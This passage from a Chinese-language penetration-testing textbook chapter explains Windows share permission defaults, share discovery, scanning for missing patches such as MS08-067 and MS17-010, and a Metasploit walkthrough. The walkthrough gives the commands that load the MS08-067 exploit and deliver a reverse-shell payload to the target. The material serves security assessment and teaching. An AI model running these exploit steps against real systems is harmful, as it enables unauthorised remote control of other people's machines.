
Windows `shares` 是用户通过 Windows 的 `Network` 选项浏览网络时出现的可用网络驱动器。Windows shares 经常配置不当，导致比应有的更多人能够访问它们。普通浏览者可以利用这一安全漏洞，而恶意内部人员若未经授权访问 Windows 系统，则可能带来严重的安全和合规后果，包括泄露敏感信息以及损坏或删除关键文件。

### Windows 默认

默认的共享权限取决于 Windows 系统版本。

#### Windows 2000/NT

在 Windows NT 和 Windows 2000 中创建共享时，默认会将 `Everyone` 组授予 `Full Control` 访问权限，以浏览、读取和写入所有文件。

你已经不应再在网络中运行这些版本的 Windows，但它们仍然存在！

![warning](images/warning.png) 如在“[Detecting Null Sessions](#c12.xhtml#c12-sec-0016)”章节前文所述，将 `IPC$` 连接与空会话（null session）映射的 **Anyone** 会自动加入 `Everyone` 组。因此，远程黑客在建立空会话后即可自动获得浏览、读取和写入 Windows NT 或 Windows 2000 服务器的权限。

#### Windows XP 及以后

在 Windows XP 及以后（包括 Windows Server 2016、Windows 10 等）系统中，`Everyone` 组仅获得共享的 **读取** 权限。此设置相较于 Windows 2000 和 Windows NT 的默认更为安全，但在某些情况下仍不希望 `Everyone` 组拥有对共享的即使读取权限。

![remember](images/remember.png) 共享权限与文件权限不同。创建共享时需要同时设置两种权限。在当前 Windows 版本中，这些设置会为普通用户创造跳过的障碍并抑制共享创建，但并非万无一失。除非你锁定 Windows 桌面，用户仍可随意共享文件，包括通过 OneDrive、ShareFile 等云端文件共享服务。

### 测试

评估共享权限是了解谁可以访问什么的有效方式。此测试显示网络共享 —  — 以及敏感信息 —  — 可能受到的暴露程度。你可以查找拥有默认权限和不必要访问权限的共享。相信我，它们无处不在！

最佳的测试方法是使用普通本地或域用户（无特殊权限）登录 Windows 系统，然后运行枚举程序，以便查看谁可以访问什么。

SoftPerfect Network Scanner 内置共享发现功能，用于 uncovering unprotected shares，相关选项在 [Figure 12-9](#c12.xhtml#c12-fig-0009) 中所示。

![ FIGURE 12-9: SoftPerfect Network Scanner’s Share Finder profile seeks out Windows shares.](images/9781119485476-fg1209.png)

 [FIGURE 12-9:](#c12.xhtml#rc12-fig-0009) SoftPerfect Network Scanner’s Share Finder profile seeks out Windows shares.

下面我会在 [第 16 章](#c16.xhtml) 中提供更多关于在非结构化文件和其他存储系统上发现敏感信息的细节。

## 利用未打补丁的漏洞

仅仅对 Windows 进行挖掘、探测可能会发现一些信息，甚至可能获得系统访问权限。但如果你发现一个能在 10 分钟内让攻击者获得完整系统访问的漏洞，情况则完全不同。使用诸如 Metasploit 之类的工具，只需针对一个缺失的补丁即可获取系统并展示整个网络的可被 compromise 的程度。缺失的补丁是黑客的“黄金宝库”。

![remember](images/remember.png) 尽管有完善的安全策略和高级的补丁管理工具，我在每个网络中都发现许多 Windows 系统未及时应用所有补丁。原因可能是漏洞扫描仪的误报，或是被认为可接受的风险而未打的补丁。即使你认为所有系统都已安装最新补丁，也必须确认。在安全评估中，信任但要验证。

![warning](images/warning.png) 在使用 Metasploit “sploit” 漏洞之前，务必了解你进入的是敏感领域。你不仅可能获得对敏感系统的“未经授权”完整访问，还可能导致被测试系统挂起或重启。请仔细阅读每个漏洞利用的文档，并谨慎操作。

在利用缺失的补丁或相关漏洞之前，你需要确认有哪些可供利用的漏洞。最佳做法是使用诸如 Nexpose 或 Nessus 等工具。我发现 Nexpose 在未经认证的网络用户身份下，能够很好地发现这些漏洞。

[Figure 12-10](#c12.xhtml#c12-fig-0010) 展示了 Nexpose 对一台运行 2008 年 Windows Plug and Play Remote Code Execution 漏洞（MS08-067）的 Windows 服务器扫描结果，这种漏洞至今仍时常出现。更常见的是，我发现了 WannaCry 勒索软件利用的 SMB Server 漏洞（MS17-010）。该漏洞极其危险，它允许攻击者 ** compromise 系统并加密驱动器**，以勒索数据。

![ FIGURE 12-10: Exploitable vulnerability found by Nexpose.](images/9781119485476-fg1210.png)

 [FIGURE 12-10:](#c12.xhtml#rc12-fig-0010) Exploitable vulnerability found by Nexpose.

![remember](images/remember.png) 只需一个用户点击一个恶意链接，你的整个网络即可被 compromise（甚至被加密）。我在第 6 章（[Chapter 6](#c06.xhtml)）中介绍了社会工程和钓鱼。

### 使用 Metasploit

找到漏洞后，下一步是利用它。下面是我使用 Metasploit Framework（Rapid7 所有并维护的开源工具）在目标服务器上获得远程命令行的示例：

1.  **下载并安装 Metasploit Framework** [ `https://www.metasploit.com` ](https://www.metasploit.com) **.**

    我使用的是 Windows 版本，你可以下载并运行可执行文件。

2.  **安装完成后，启动 Metasploit 控制台，这是 Metasploit 的主控制台。**

    （也可以通过浏览器访问基于网页的 Metasploit 版本，但我更倾向于控制台界面。）

    你会看到类似 [Figure 12-11](#c12.xhtml#c12-fig-0011) 所示的界面。

3.  **输入想要运行的 exploit。**

    如果要运行 Microsoft MS08-067 Plug and Play exploit，输入以下命令：

    `use exploit/windows/smb/ms08_067_netapi`

4.  **输入目标主机 (RHOST) 和本地主机 (LHOST) 的 IP 地址：**

    `set RHOST ip_addressset LHOST ip_address`

5.  **设置目标操作系统（通常为 0 表示自动定位）：**

    `set TARGET 0`

6.  **设置要执行的 payload（攻击载荷）。**

    我通常选择 `windows/shell_reverse_tcp`，它会在被利用的系统上提供一个远程命令行。

    [Figure 12-12](#c12.xhtml#c12-fig-0012) 展示了在 Metasploit 控制台上应看到的界面。

7.  **在 Metasploit 控制台中输入** `exploit` **。**

    该命令执行最终步骤，Metasploit 将载荷交付到目标系统。假设 exploit 成功，你将看到一个命令行提示符，可以输入常规 DOS 命令（如 `dir`），如 [Figure 12-13](#c12.xhtml#c12-fig-0013) 所示。

![ FIGURE 12-11: The main Metasploit console](images/9781119485476-fg1211.png)

 [FIGURE 12-11:](#rc12-fig-0011) The main Metasploit console

